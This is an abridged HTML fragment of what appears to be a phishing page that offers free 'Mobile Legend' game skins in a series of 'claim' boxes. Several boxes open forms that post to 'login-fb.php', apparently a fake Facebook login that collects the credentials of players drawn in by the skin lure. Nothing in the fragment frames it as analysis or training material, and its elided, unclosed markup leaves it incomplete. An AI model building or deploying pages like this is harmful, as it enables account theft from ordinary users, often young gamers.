    ...
    <div id="claim">
        ...
        <div class="idhaam69">
            <div class="box-idhaam69">
                ...
                <img class="img-box" alt="idhaam69" src="./assets/images/lba.jpg"/>
            ...
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/lbt.jpg"/>
                <form action="login-fb.php" method="POST">
            ...
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/lbh.jpg"/>
                <form action="login-fb.php" method="POST">
            ...
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/lbf.jpg"/>
                <form action="login-fb.php" method="POST">
            ...
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/lbg.jpg"/>
                <form action="login-fb.php" method="POST">
